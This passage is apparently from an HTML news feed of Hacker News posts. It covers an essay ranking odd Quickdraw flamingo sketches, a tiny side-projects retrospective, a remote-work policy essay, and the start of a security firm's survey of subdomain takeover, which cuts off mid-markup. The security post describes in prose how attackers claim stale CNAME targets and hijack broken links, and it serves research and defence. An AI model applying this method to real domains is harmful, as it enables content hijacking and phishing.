<p>You can check out some more examples <a href="https://colinmorris.github.io/assets/quickdraw/svgs/botflamingos_awful.svg">here</a>.</p>

<h3 id="scribbles">Scribbles</h3>



<p>In most cases, the artist started out with something flamingo-like, then scratched it out in frustration. The Quickdraw dataset encodes sketches as a sequence of pen strokes, rather than just a grid of pixels, so we can actually reconstruct the history of sketches like this:</p>



<h3 id="cheating-attempts">Cheating attempts</h3>



<h3 id="wrong-category">Wrong category</h3>



<p>There are some cases where the artist was pretty clearly drawing a different Quickdraw category like ‘pineapple’, or ‘compass’. It’s not clear whether it was a glitch that landed these images in the flamingo dataset, or user error (maybe the players didn’t realize they ran out of time and were given a new category?).</p>

<h3 id="have-you-ever-even-seen-a-flamingo">Have you ever even seen a flamingo?</h3>



<p>More head-scratching examples <a href="https://colinmorris.github.io/assets/quickdraw/svgs/botflamingos_wtf.svg">here</a>. The ‘wrong category’ explanation doesn’t work for most of these, because they don’t look like any of Quickdraw’s other categories (for example, there are no categories for ‘beaver’, ‘sitar’, or ‘female skeleton doing aerobics’).</p>

<h3 id="graffiti">Graffiti</h3>

<figure>
    <img src="https://colinmorris.github.io/assets/quickdraw/svgs/graffiti_censored.svg">
</figure>

<p>Some scoundrels just treated Quickdraw like a bathroom wall. The uncensored version is <a href="https://colinmorris.github.io/assets/quickdraw/svgs/graffiti_uncensored.svg">here</a> (NSFW).</p>

<h3 id="the-unjustly-maligned">The unjustly maligned</h3>



<p>Most of what I found was garbage, but the three above are actually kind of gorgeous. Add some colour to #3 and it could be a New Yorker cover! What gives?</p>

<p>These are great drawings, and pretty recognizable as flamingos, but that doesn’t count for much. We’re not ranking by how clearly these images represent their subject (i.e. <code>P(category=flamingo | drawing)</code>), but rather how likely someone is to come up with this when asked to draw a flamingo (<code>P(drawing | category=flamingo)</code>).</p>

<p>Very few people would think to draw the legs and head, with the body out of frame, as #3 does. #1 uses unusually many short, disconnected lines, and #2 uses a unique stylized head shape.</p>

<figure>
<div>
    <p><img src="https://colinmorris.github.io/assets/quickdraw/svgs/bottom/notbad/5.svg">
    </p>
    <p><img src="https://colinmorris.github.io/assets/quickdraw/Audubon-Flamingo.jpg">
    </p>
</div>
<figcaption>Left: Anonymous Quickdraw artist. Right: The American flamingo, illustrated by by <a href="https://en.wikipedia.org/wiki/John_James_Audubon">John Audubon</a>.</figcaption>
</figure>

<p>The drawing above is another good example. Flamingos do bend their heads down low like that, but when asked to draw a flamingo, almost no-one thinks to pose it with its head below the horizon.</p>

<p>
You can browse a gallery of all the bottom 400 flamingos <span><a href="https://colinmorris.github.io/badflamingos">here</a></span> (warning: contains a few NSFW sketches).
</p>

<h2 id="is-this-useful">Is this useful?</h2>

<p>It totally could be!</p>

<p>Google described their dataset as being ‘individually moderated’, and you can scroll through the examples <a href="https://quickdraw.withgoogle.com/data/flamingo">here</a> for a long time before hitting any graffiti (and if you do find any, you can even click it to ‘flag as inappropriate’). It seems they’ve already done a pretty good job of filtering out most of the irrelevant/malicious sketches that were surely rampant in the raw data.</p>

<p>But this approach was able to easily identify a subset of sketches containing a high density of overlooked graffiti, scribbles, and irrelevant sketches. And it’s quite ‘cheap’, since it uses an existing model trained for a different purpose. If we wanted to go further, this would be a good place to start to get some labelled examples to bootstrap a graffiti classifier.</p>

<h2 id="appendix-measuring-probability">Appendix: Measuring probability</h2>

<p>(Warning: There are no more funny flamingo sketches ahead, just boring technical details.)</p>

<p>I’ve been talking about measuring the ‘probability’ a Sketch-RNN model assigns to each sketch, and ranking by those probabilities, but the truth is a little messier. There are a few complications we need to consider here.</p>

<h3 id="probability-vs-probability-density">Probability vs. probability density</h3>

<p>Sketch-RNN models the location of the pen as a continuous random variable. In this view, the probability of any stroke’s (x, y) position, and therefore of any sketch as a whole, is 0. So it makes more sense to talk about measuring the <a href="https://en.wikipedia.org/wiki/Probability_density_function">probability density</a> of sketches. If A’s density is twice B’s, then A is in some sense ‘twice as likely’. (Both sketches still have probability zero, but we can measure a non-zero probability for the set of similar sketches in some tiny neighbourhood of equal size around A and B, and the probability near A will be twice as high).</p>

<h3 id="varying-lengths">Varying lengths</h3>

<p>Sketch-RNN outputs probabilities (/densities) per stroke. The natural way to get the probability (density) for a sketch as a whole would be to multiply the values for each stroke. (Densities can be multiplied together much like probabilities.)</p>

<p>However, the number of strokes per drawing in the dataset varies:</p>

<figure>
    <img src="https://colinmorris.github.io/assets/quickdraw/nstrokes.png">
    <figcaption>
        I couldn't find much information on how the dataset was preprocessed, but it seems pretty clear that this poor distribution has been violently amputated.
    </figcaption>
</figure>

<p><em>A priori</em>, we’d expect longer sketches to be less probable - every time we multiply probabilities, we get a smaller number. In language modeling, we’d control for this by measuring the <a href="https://en.wikipedia.org/wiki/Perplexity#Perplexity_per_word">perplexity per word</a> of a sentence or longer text. We can do something similar here, and measure the density per stroke.</p>

<p>(An interesting twist is that sorting by non-normalized densities, the sketches with the lowest <em>and</em> the highest values were biased toward having more strokes, which completely broke my intuition. The reason for this is that, unlike probabilities, densities can be greater than 1. If the strokes in a sketch mostly have densities greater than 1, then adding more strokes leads to a higher overall density. This doesn’t mean that strokes <code>S_1, S_2, S_3</code> are more likely than their prefix <code>S_1, S_2</code> (that’d be weird). It means that comparing the values of density functions with different dimensions is generally a bad idea.)</p>

<h3 id="what-i-actually-did">What I actually did</h3>

<p>I sorted on formula (9) in <a href="https://arxiv.org/pdf/1704.03477.pdf">this paper</a> - the reconstruction loss. This is basically the log density of the sketch (times the constant, <code>-1/N_max</code>). A minor deviation from (9): <code>L_p</code>, the loss with respect to pen state, is summed up to the number of strokes in the sketch,<code>N_s</code>, not the maximum strokes per sketch,<code>N_max</code>. (This is actually <a href="https://github.com/tensorflow/magenta/blob/v0.1.13/magenta/models/sketch_rnn/model.py#L298">a hidden feature of the code</a> when running in evaluation mode. I’m not sure whether the loss figures they reported e.g. in Table 1 include this tweak, but I’d be surprised if it makes much difference.)</p>

<p>The <a href="https://colinmorris.github.io/badflamingos">Bad Flamingos</a> page sorts by the loss function normalized by number of strokes. The examples on this page were mostly selected from the sketches with the worst unnormalized values. Qualitatively, both metrics gave pretty reasonable results with a high degree of overlap, but I ended up preferring the normalized version because its bottom N had a more representative distribution of lengths. The fact that unnormalized loss worked at all is basically a fluke and not something to rely on - if you rescaled the (x,y) values of pen positions to different units, it could drastically change the sort for unnormalized loss, but it wouldn’t affect <code>loss/nstrokes</code>.</p>

<p>All the code for this experiment is available <a href="https://github.com/colinmorris/sketch-rnn-experiments">here</a>.</p>

  
    
        
        
      <p>
        <small>Tagged: <a href="https://colinmorris.github.io/blog/tagged/machine-learning/">Machine Learning</a></small>
      </p>
    


  </div>



      

</article>

  </div>
</div></div>]]>
            </description>
            <link>https://colinmorris.github.io/blog/bad_flamingos</link>
            <guid isPermaLink="false">hacker-news-small-sites-25135848</guid>
            <pubDate>Wed, 18 Nov 2020 12:03:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Six Months of Tiny Projects]]>
            </title>
            <description>
<![CDATA[
Score 854 | Comments 142 (<a href="https://news.ycombinator.com/item?id=25135752">thread link</a>) | @tinyprojects
<br/>
November 18, 2020 | https://tinyprojects.dev/posts/six_months_of_tiny_projects | <a href="https://web.archive.org/web/*/https://tinyprojects.dev/posts/six_months_of_tiny_projects">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
	
	<nav>
		<a href="https://tinyprojects.dev/">Home</a>
		<a href="https://tinyprojects.dev/projects">Projects</a>
		<a href="https://tinyprojects.dev/guides">Guides</a>
		<a href="https://tinyprojects.dev/blog">Blog</a>
	</nav>
	
	<p><i>November 18th 2020</i></p>

	<p>Six months ago, I set myself the goal of creating one tiny project each week.</p> 

	<p>My main aim was to get better at testing out all the ideas I had written down in my phone, but not actually done anything with.</p>

	<p>26 weeks later, and a quick glance of this website, you'll notice I've launched 6 things.</p>

	<p>Although I'm 20 projects short, it's not all bad. My projects are generating some passive income, I've gone from no online following, to a few hundred twitter followers, and I've had a great time building weird and wonderful internet things.</p>

	<p>In this post I'll give an update on how these projects are performing, and the pros and cons of launching micro-businesses.</p>

	<p>Let's rewind.</p>

	<h3>💡 <a href="https://tinyprojects.dev/projects/tiny_website" target="_blank">Tiny Website</a></h3>
	<ul>
		<li><i>Page views: <b>129,000</b></i></li>
		<li><i>Unique users: <b>58,000</b></i></li>
		<li><i>HN Upvotes: <b>348</b></i></li>
		<li><i>Cost: <b>£10.00</b></i></li>
	</ul>

	<p>Tiny Projects was born the day after my 25th birthday. Project #1 is this bare-bones tiny website that you're reading right now.</p>

	<p>When it launched, the only content on this website was a blog post, a guide on making tiny websites, and an update about my goals.</p>

	<p>Randomly, I decided to submit my blog post "Tiny websites are great" onto Hacker News. Over the next 24 hours it hit the top of the front page, bringing 25k users to this site in its first day. It was absolutely thrilling.</p>

	<p>As a double whammy, the guide I'd produced also hit the top of the learn programming sub-reddit with 1.3k upvotes.</p>

	<p>Somehow, I'd managed to hit a homerun with no idea what I was doing. Pageviews, followers and emails were flying in fast. Anyone who has produced a bit of viral content on the internet will know, the dopamine rush is insane.</p> 

	<h3>🌐 <a href="https://tinyprojects.dev/projects/silicon_valley_domain_names" target="_blank">Silicon Valley Domain names</a></h3>
	<ul>
		<li><i>Page views: <b>28,500</b></i></li>
		<li><i>Unique users: <b>25,500</b></i></li>
		<li><i>HN Upvotes: <b>410</b></i></li>
		<li><i>Cost: <b>£76.25</b></i></li>
	</ul>

	<p>Funnily enough, my second Tiny Project was the only one I actually completed in a week. Spurred on by the previous project, I was keen to replicate my success.</p>

	<p>I wanted to investigate domain names. Specifically, was it possible to buy a google.x domain name? It was an investigative piece with a bit of coding sprinkled in.</p>

	<p>Completing this project in a week was gruelling. My day-job was neglected, and I pulled some very long hours. However, 7 days later, I hit publish on my second blog post: "I bought netflix.soy".</p>

	<p>Again, I posted it on Hacker News. It became the most viral thing I've written.</p>

	<p>The Tiny Projects website received 28k page views, and the post got 410 upvotes. Hundreds of followers and emails again poured in.</p>

	<p>Writing two viral pieces back-to-back made me question what I was really doing. Somehow I'd  stumbled into writing click-baity blog posts for Hacker News instead of building tiny projects.</p>

	<p>6 months on, I still own all the domains I purchased for this project except the Facebook one. Damn you Zuck.</p>

	<h3>⚔️ <a href="https://tinyprojects.dev/projects/battle_royale" target="_blank">8-bit Battle Royale</a></h3>
	<ul>
		<li><i>Downloads: <b>25</b></i></li>
		<li><i>HN Upvotes: <b>3</b></i></li>
		<li><i>Revenue: <b>£0.00</b></i></li>
		<li><i>Cost: <b>£36.71</b></i></li>
	</ul>

	<p>For my third tiny project, I decided I wanted to make an online game.</p>

	<p>With minimal knowledge of Unity, I cobbled together a tiny battle royale game called "Wee Royale" in 2 weeks and launched it on Android.</p>

	<p>Posting this project write up on Hacker News got zero attention. I expected this, as it didn't really fit the usual HN content, but I was still disappointed. My brain had been jaded by the massive numbers of the first two posts.</p>

	<p>Wee Royale currently has 25 downloads on the Google Play Store. I'm actually not sure if the game still works though.</p>

	<p>Overall, Wee Royale was a flop, but it was hilarious to play it with my friends.</p>

	<h3>🛍️ <a href="https://tinyprojects.dev/projects/one_item_store" target="_blank">One Item Store</a></h3>
	<ul>
		<li><i>Page views: <b>1,500</b></i></li>
		<li><i>Stores: <b>1,400</b></i></li>
		<li><i>PH Upvotes: <b>83</b></i></li>
		<li><i>Revenue: <b>£1.63</b></i></li>
		<li><i>Cost: <b>£41.00</b></i></li>
	</ul>

	<p>With a minimalist design, and the tag line "just sell your stuff", One Item Store lets anyone create an online shop in minutes to sell their goods.</p>

	<p>After two weeks of building my micro e-commerce platform, I launched it on Product Hunt. At the end of the day I finished on the homepage with 83 upvotes.</p>

	<p>Today, people have created over 1400 stores, selling everything from t-shirts, to human beings. I've seen some very strange things.</p>

	<p>In total, £163.09 has flowed through One Item Store checkouts, mainly from a car dealership in Australia offering deals throughout the pandemic. I take a small 1% fee on every transaction, netting me a small fortune of £1.63.</p>

	<p>Although its not a significant amount, this was my first Tiny Projects internet money! The best thing is, One Item Store makes money without me having to do anything.</p>

	<p>One Item Store is a Tiny Project I'd like to continue building. My next step would be to add some better checkout designs, and make the website look a bit more legit.</p>

	<h3>📗 <a href="https://tinyprojects.dev/projects/snormal" target="_blank">Snormal</a></h3>
	<ul>
		<li><i>Page views: <b>2,000</b></i></li>
		<li><i>Users: <b>200</b></i></li>
		<li><i>PH Upvotes: <b>59</b></i></li>
		<li><i>Revenue: <b>£0.00</b></i></li>
		<li><i>Cost: <b>£10.00</b></i></li>
	</ul>

	<p>Snormal is a social network for everything that doesn't make it onto your Instagram highlight reel. A typical post on Snormal is something like: "Dude, I just ate a whole baguette in bed".</p>

	<p>I launched Snormal with zero intentions of making any money. It was a bit of a social experiment to see if people were becoming as jaded with social media as me.</p>

	<p>After 1 month of building, and an accidental Product Hunt launch, Snormal has gone on to gain 200 registered users, who have scrolled 4432 times on the discover feed.</p>

	<p>Its incredibly fun running a micro-social network.</p>

	<p>Two weeks after Snormal launched, I hadn't implemented comments on posts. When I finally added them, it felt godlike letting people finally talk to each other.</p>

	<p>Growth on Snormal slowly increasing. For some strange reason it has become popular in Portugal. Have a scroll now, and you'll see loads of statuses in Portugese.</p>

	<h3>💸 <a href="https://tinyprojects.dev/projects/earlyname" target="_blank">Earlyname</a></h3>
	<ul>
		<li><i>Page views: <b>10,000</b></i></li>
		<li><i>Subscribers: <b>1,500</b></i></li>
		<li><i>PH Upvotes: <b>274</b></i></li>
		<li><i>MRR: <b>$200.00</b></i></li>
		<li><i>Cost: <b>$108.20</b></i></li>
	</ul>

	<p>Earlyname helps you claim rare usernames (like @ben or @alice) on new, emerging social platforms. Currently it is generating $200/month.</p>

	<p>Running Earlyname is so much fun. I get to talk with founders, try out new products, do a bit of web scraping/automation, and find rare usernames for people.</p>

	<p>The only downside is that it requires my input every month to produce a new email. I'm anxious for the month I can't find any new social platforms.</p>

	<p>At present, Earlyname has 1500 subscribers on its email list, a number which thankfully seems to be growing naturally.</p>

	<p>Although its currently only at $200/mo, its cool to think Earlyname is generating $2k/year. My plan is to keep plugging away launching monthly newsletters and see how high that monthly revenue number can get.</p>

	<h3>👍 Positives of Tiny Projects</h3>

	<p>I believe there's a big advantage to this "micro-bet" approach of launching many tiny businesses, and then sticking with the ones that become successful.</p>

	<p>Firstly, it drastically reduces the risk of putting too much time into an idea that doesn't quite work. Even if you stumbled across a decent idea that did work, what if there's an amazing one just around the corner? It keeps you on your toes.</p>

	<p>Creating lots of tiny businesses also keeps things fun and interesting. This is probably the most important factor for me.</p>

	<p>Feeling obligued to keep building something that you've sunk hundreds of hours into but no longer enjoy sounds like my personal hell.</p>

	<p>With tiny projects, the stakes are so low, I can kill a project with no guilt and build something else, or just bounce between the projects I want to work on.</p>

	<h3>👎 Negatives of Tiny Projects</h3>

	<p>My original plan was to launch one tiny project each week, however I've realised this is an insane schedule. You can't build or document anything meaningful in this time.</p>

	<p>This schedule might be possible if I treated Tiny Projects full-time like a YouTuber. But, I don't think going all in on Micro-SaaS businesses would be very fun with the revenue they're currently generating.</p>

	<p>1-2 months is a more reasonable tiny project timeframe. It gives you enough time to build something with substance, and test the idea thoroughly.</p>

	<p>One major downside of launching lots of things is that you become way too happy to give up on a project when it doesn't show instant success.</p>

	<p>Perhaps if I spent more time on marketing, or slightly pivoted a project, I could see more success. Currently, I'm more inclined to just start something new.</p>

	<p>Maintaining lots of software can also become a bit of a burden. Once the domain name renewal date comes around, I'll have to make some decisions as to whether a project lives on for another year or not.</p>

	<h3>🔮 Conclusions &amp; The Future</h3>

	<p>I feel like I'm trying to learn the skill of generating better ideas, and rapidly building and launching them into a business.</p>

	<p>I try to think about this process like going for a run. The more runs I do, the faster and fitter I'll be. The more projects I launch, the better and more profitable they'll be.</p>

	<p>How often does someone build &amp; launch a business in their lifetime? I'm hoping that by doing this process over and over again, I'll discover some really interesting things.</p>
	
	<p>My main goal for the next six months of Tiny Projects is to learn how to get better at making money on the internet from my projects.</p>

	<p>A Product Hunt launch can easily get you a spike in traffic, but afterwards I really don't know what I'm doing. There's this whole other level afterwards called "sales &amp; marketing" that I want to master.</p>

	<p>Another goal is to also be more consistent with my writing. Hopefully, this ultimately means you'll be hearing a lot more things from me!</p>

	<p>It was nice to catch up.</p>

	
	
	
	
	
	

</div>]]>
            </description>
            <link>https://tinyprojects.dev/posts/six_months_of_tiny_projects</link>
            <guid isPermaLink="false">hacker-news-small-sites-25135752</guid>
            <pubDate>Wed, 18 Nov 2020 11:48:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remote work is our once-in-a-generation chance to rebalance the economy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25135657">thread link</a>) | @hrishikesh1990
<br/>
November 18, 2020 | https://www.remote.tools/remote-work/remote-work-is-our-once-in-a-generation-chance-to-rebalance-the-economy | <a href="https://web.archive.org/web/*/https://www.remote.tools/remote-work/remote-work-is-our-once-in-a-generation-chance-to-rebalance-the-economy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <h2>Remote work is a once-in-a-generation chance for rebalancing the economy. Here is the problem, solution, and next steps for governments &amp; local bodies</h2>
  
  <p><img src="https://remote-tools-images.s3.amazonaws.com/Art_Of_Managing_Male_Final.png" width="100%" max-width="700px" alt="Remote work is our once-in-a-generation chance to rebalance the economy"></p><p>Last week, Deutsche bank came up with an absurd suggestion of having a <a target="_blank" href="https://remoteclan.com/s/klhjgx/deustche_bank_study_poses_question">5% privilege tax for those who work remotely</a>. Their argument: when people work from home, they use less of public infrastructure &amp; the entire ecosystem surrounding the office suffers. So the tax helps give a push to the economy. Not only is this a very narrow view of the impact of remote work at scale but it also completely ignores a large-scale economy problem that can be fixed with remote working. This is a once-in-a-generation chance of rebalancing the economy, so we have to act now else it's no use.</p><br>
<h2>Problem: Regional inequality = Overcrowded &amp; expensive metropolitan cities</h2>
<p>Post the industrial era, many technological &amp; economical forces have fuelled the rise of cities. Over the years, this has caused overcrowding of metropolitan cities. <a target="_blank" href="https://voxeu.org/article/return-regional-inequality-europe-1900-today">This study</a> of Europe from 1900 to today shows that 1980 was a point of inflection after which the migration to big cities &amp; the gap of regional inequality has only increased.</p>
<p>Governments have been trying hard to reduce this regional inequality e.g. financial incentives or lower taxes to attract big employers. But nothing has worked at scale to lure people away from a handful of cities.</p><br>
<h2>Solution: Large-scale migration from big cities to tier-2 cities &amp; towns, thanks to remote work</h2>
<p>The sudden remoteness situation due to Covid19 and its permanent impact on our way of working has opened up a new, rare possibility - people dispersing from a few overcrowded, expensive cities to tier-2 cities &amp; towns while retaining their good jobs.</p>
<p>The shift, when it happens, would also be a more organic one compared to governments persuading employers &amp; individuals to move away from cities. The great thing is that governments just need to act as catalysts in facilitating this transition which is already happening.</p><br>
<h2>This chance of rebalancing the economy is not to be wasted. Next steps for governments &amp; local bodies:</h2>
<p>As I said, the lure to move away from cities is already taken care of by the pandemic. Governments just need to make more the transition more easier &amp; lucrative.</p>
<p>Here's a few recommendations for local &amp; national policymakers of things that can be done in tier-2 cities &amp; towns:</p>
<p>1. Ensuring availability of fast broadband internet (we have written more about the necessity of this <a href="https://www.remote.tools/remote-work/remote-work-bill-of-rights" target="_blank">here</a>).<br>2. Setting up &amp; repairing basic public services (e.g. schools, transport, hospitals) which are preconditions for a good place to live &amp; raise a family.<br>3. Setting up co-working spaces &amp; mobile offices.<br>4. One-time incentive or bonus if people make the move from cities to towns.<br>5. Rubbishing claims of any kind of tax or pay cuts for working remotely (no-brainer, but just calling it out).</p>
<p>Local governments have instituted such programs in the past &amp; they can serve as great inspirations, e.g. <a target="_blank" href="https://tulsaremote.com/">Tulsa Remote</a>.</p>
<p>Regional inequality poses huge problems and we have got this one chance in many decades to actually fix it. Let's make sure we don't lose out on this one :)</p>
</div></div>]]>
            </description>
            <link>https://www.remote.tools/remote-work/remote-work-is-our-once-in-a-generation-chance-to-rebalance-the-economy</link>
            <guid isPermaLink="false">hacker-news-small-sites-25135657</guid>
            <pubDate>Wed, 18 Nov 2020 11:35:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Internet-Wide Analysis of Subdomain Takeover]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25135317">thread link</a>) | @kkm
<br/>
November 18, 2020 | https://redhuntlabs.com/blog/project-resonance-wave-1.html | <a href="https://web.archive.org/web/*/https://redhuntlabs.com/blog/project-resonance-wave-1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><br>At RedHunt Labs, we regularly perform various internet-wide studies under <strong><a rel="noreferrer noopener" href="https://redhuntlabs.com/blog/project-resonance-wave-0.html" data-type="URL" data-id="https://redhuntlabs.com/blog/project-resonance-wave-0.html" target="_blank">Project Resonance</a></strong>, to keep up with ever-changing cyberspace as well as to enrich our product <a rel="noreferrer noopener" href="https://redhuntlabs.com/nvadr" data-type="URL" data-id="https://redhuntlabs.com/nvadr" target="_blank"><strong>NVADR</strong></a>. This blog post is about one of our recent studies related to misconfigured CNAME records that can cause subdomain takeovers on a massive scale.</p>



<h3>Introduction to Subdomain Takeover</h3>



<p>DNS is the backbone of the internet. It is often called the internet’s phone book as it maps human-perceivable domain names to IP addresses that computers understand. Without DNS, there wouldn’t be online websites that can be remembered. There’s no google.com, twitter.com, or redhuntlabs.com, just a weird sequence of numbers.</p>



<p>A domain can be pointed to an IP address or another domain/host using DNS records such as A, CNAME, DNAME, etc. A domain/subdomain cannot be taken over, when both the DNS record and the resource it points to (IP or another domain), is under control. If the owner of the domain loses ownership of the resource the DNS record points to, the resource itself might become claimable.</p>



<p>Here are a few <strong><a rel="noreferrer noopener" href="https://www.hackerone.com/hacktivity" data-type="URL" data-id="https://www.hackerone.com/hacktivity" target="_blank">HackerOne</a></strong> reports showing how attackers claimed the resources pointed by stale DNS records of famous companies. <strong><a rel="noreferrer noopener" href="https://hackerone.com/hacktivity?querystring=subdomain%20takeover" target="_blank">Searching</a><a href="https://hackerone.com/hacktivity?querystring=subdomain%20takeover"> for it on HackerOne</a> </strong>gives 100+ such reports. Few reports show how attackers were able to exploit / bypass other web app functionalities with the help of this vulnerability.</p>







<h3>How does it work?</h3>



<p>Let’s say a developer wants to create a web app for his newly created organization. A decade ago, this process would be something similar to this: buy/lease an IP address, host your website on the server and point the DNS record to this IP. This process remained the same even if you wanted to host a static website or a landing page.</p>



<p>With the increase of Cloud and other SaaS services, now all the developer needs to do is use a service to host the website and point the DNS record to the resource. For example, at Heroku, such a domain/subdomain would take the form “<em>newproject.herokuapp.com”</em>. The developer will ultimately want the web app to appear to be hosted on a domain/subdomain (say, <em>app.neworg.com</em>) of his own organization’s domain. Therefore, he makes use of a CNAME record which is configured to forward all queries to his organization’s subdomain, i.e. <em>app.neworg.com</em>, to the cloud provider’s subdomain, <em>newproject.herokuapp.com</em>, where the web app is hosted.</p>



<div><figure><img data-attachment-id="4541" data-permalink="https://redhuntlabs.com/blog/project-resonance-wave-1.html/dns-record-3" data-orig-file="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?fit=1200%2C400&amp;ssl=1" data-orig-size="1200,400" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dns-record-3" data-image-description="" data-medium-file="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?fit=300%2C100&amp;ssl=1" data-large-file="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?fit=640%2C213&amp;ssl=1" loading="lazy" width="640" height="213" src="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?resize=640%2C213&amp;ssl=1" alt="" srcset="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?resize=1024%2C341&amp;ssl=1 1024w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?resize=300%2C100&amp;ssl=1 300w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?resize=768%2C256&amp;ssl=1 768w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?resize=1024%2C341&amp;ssl=1 1024w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?resize=300%2C100&amp;ssl=1 300w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?resize=768%2C256&amp;ssl=1 768w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?w=1200&amp;ssl=1 1200w" data-lazy-src="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/dns-record-3.png?resize=640%2C213&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>A CNAME Record </figcaption></figure></div>



<p>Now the potential for a subdomain takeover occurs when the webpage hosted at the cloud provider is deleted but the DNS entry is retained. The attacker simply now re-registers the host at the cloud provider, adds the organization’s subdomain as an alias, and thus controls what content is hosted. Since the stale CNAME records originally have not been removed, <em>app.neworg.com </em>starts serving the attacker-controlled content.</p>



<p>In a similar way, another variant is known as “second-order subdomain takeovers” or more popularly, “<a rel="noreferrer noopener" href="https://edoverflow.com/2017/broken-link-hijacking/" target="_blank"><strong>broken-link hijacking</strong></a>” occurs when the potentially vulnerable subdomains are used to serve content on the target’s website but they do not necessarily belong to the target. This means that the resource is being served on the webpage, for example, via a blob of JavaScript, and the attacker can claim the subdomain from which the resource is being imported. Second-order takeovers usually have a lesser impact than the earlier, but still pose a significant threat from an organization’s perspective.</p>



<h3>What we did.</h3>



<p>Our motivation was to perform a survey and analyze the status quo of vulnerable domains/subdomains in the present cyberspace. We conducted an internet-wide survey consisting of approximately 220 million hosts collected by our thousands of bots collecting various kinds of asset information from all over the internet. A database was created which contained CNAME records and related fingerprints of several vulnerable platforms, many of which we ingeniously studied to see if they can be taken over (if added as a service) as well as picked some of them that are already known to be vulnerable.</p>



<p>An automation setup was designed to effectively perform the task of checking whether the domains/subdomains were vulnerable to takeover. </p>



<div><figure><img data-attachment-id="4465" data-permalink="https://redhuntlabs.com/blog/project-resonance-wave-1.html/tool-logic" data-orig-file="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?fit=2349%2C2139&amp;ssl=1" data-orig-size="2349,2139" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="tool-logic" data-image-description="" data-medium-file="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?fit=300%2C273&amp;ssl=1" data-large-file="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?fit=640%2C583&amp;ssl=1" loading="lazy" src="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=640%2C582&amp;ssl=1" alt="tool_logic" width="640" height="582" srcset="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=1024%2C932&amp;ssl=1 1024w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=300%2C273&amp;ssl=1 300w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=768%2C699&amp;ssl=1 768w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=1536%2C1399&amp;ssl=1 1536w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=2048%2C1865&amp;ssl=1 2048w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=1200%2C1093&amp;ssl=1 1200w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?w=1280&amp;ssl=1 1280w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?w=1920&amp;ssl=1 1920w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=1024%2C932&amp;ssl=1 1024w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=300%2C273&amp;ssl=1 300w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=768%2C699&amp;ssl=1 768w, 